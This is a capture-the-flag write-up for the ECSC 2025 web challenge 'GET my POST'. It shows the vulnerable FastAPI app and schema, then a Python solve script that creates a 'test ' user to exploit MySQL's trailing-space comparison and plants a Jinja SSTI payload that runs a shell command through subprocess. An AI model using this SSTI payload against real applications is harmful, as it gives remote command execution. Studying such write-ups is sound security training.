# GET my POST

> Old school web.
>
> [https://myschool.ecsc25.hack.cert.pl/](https://myschool.ecsc25.hack.cert.pl/)
>
> **app.py**
> ```py
> import uuid
> 
> import uvicorn
> from dataclasses import dataclass
> from typing import Optional
> from fastapi import Response, Request, FastAPI, HTTPException
> from jinja2 import Template
> import mysql.connector
> 
> 
> cnx_pool = mysql.connector.pooling.MySQLConnectionPool(
>     host="mysql",
>     port=3306,
>     user="user",
>     password="user",
>     database="db",
>     pool_size=32,
>     pool_name="pool",
>     use_pure=True,
> )
> 
> 
> @dataclass
> class User:
>     username: Optional[str] = uuid.uuid4()
>     bio: Optional[str] = "default bio"
> 
> 
> app = FastAPI()
> 
> 
> @app.middleware("http")
> async def get_db_connection(request: Request, call_next):
>     response = Response("Internal server error", status_code=500)
>     request.state.db = cnx_pool.get_connection()
>     try:
>         response = await call_next(request)
>     finally:
>         request.state.db.close()
>     return response
> 
> 
> @app.post("/users/")
> def create_user(request: Request, user: User):
>     if user.username != "test":
>         cursor = request.state.db.cursor()
>         session_id = uuid.uuid4()
>         cursor.execute(
>             "insert into users (username, bio,session_id) values (%s,%s,%s)",
>             [user.username, user.bio, str(session_id)],
>         )
>         request.state.db.commit()
>         return session_id
>     else:
>         raise HTTPException(status_code=403, detail="Can't modify the test user!")
> 
> 
> @app.get("/users/")
> def get_users(request: Request, session_id: Optional[str] = None):
>     cursor = request.state.db.cursor()
>     query = "select username, bio, (username='test') as matched from users where (session_id is NULL or session_id=%s)"
>     cursor.execute(query, [session_id])
>     found = [
>         f"Welcome {username}, {bio}!"
>         for (username, bio, matched) in cursor
>         if matched != False
>     ]
>     return Template("\n".join(found)).render()
> 
> 
> @app.get("/")
> def index():
>     return "You can't connect to this API with your browser. Check the source code."
> 
> 
> if __name__ == "__main__":
>     uvicorn.run(app)
>
> ```
>
> **schema.sql**
>
> ```sql
> DROP TABLE IF EXISTS `users`;
> 
> CREATE TABLE `users` (
>   `id` int(9) unsigned NOT NULL AUTO_INCREMENT,
>   `username` varchar(100),
>   `bio` varchar(255),
>   `session_id` varchar(100),
>   PRIMARY KEY (`id`)
> ) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=ASCII;
> 
> INSERT INTO `users` (`id`, `username`, `bio`) VALUES (1, 'test', 'test bio');
> ```

## Solution
For some reason MySQL discards trailing spaces when comparing strings. The solution is to create a user called `'test '` (with a space at the end) and some Jinja expression to perform SSTI and read the flag.

```py
import requests

resp = requests.post('https://myschool.ecsc25.hack.cert.pl/users', json={"username": "test ", "bio": "{{ ''.__class__.mro()[1].__subclasses__()[271]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip() }}"})
sid = resp.text[1:-1]
resp = requests.get(f'https://myschool.ecsc25.hack.cert.pl/users?session_id={sid}')
print(resp.text)
```

## Flag
`ecsc25{NULL_is_not_always_False}`
